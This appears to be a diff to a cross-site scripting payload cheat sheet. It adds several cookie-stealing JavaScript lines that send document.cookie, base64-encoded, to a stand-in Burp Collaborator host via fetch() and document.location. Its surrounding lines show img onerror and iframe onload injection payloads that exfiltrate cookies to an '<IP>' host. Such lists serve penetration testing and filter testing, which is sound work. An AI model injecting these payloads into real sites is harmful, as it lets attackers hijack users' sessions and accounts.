@@ -84,6 +84,13 @@ javascript:alert(0)
 
 #### COOKIE-STEALER
 ```js
+
+fetch('https://<BURP-COLLAB>/?cookie='+btoa(document.cookie)
+
+document.location='https://<BURP-COLLAB>/?cookies='+btoa(document.cookie)
+
+${document.location='https://<BURP-COLLAB>/?cookies='+document.cookie;}
+
 <img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>
 
 <img src=0 onerror="new Image().src='https://<IP>/?cookie='+btoa(document.cookie)">
@@ -285,4 +292,5 @@ setRequestHeader()
 
 ```html
 <iframe src="<IP>/#" onload="this.src+='<img src=0 onerror=alert(0)>'</iframe>
+
 ```
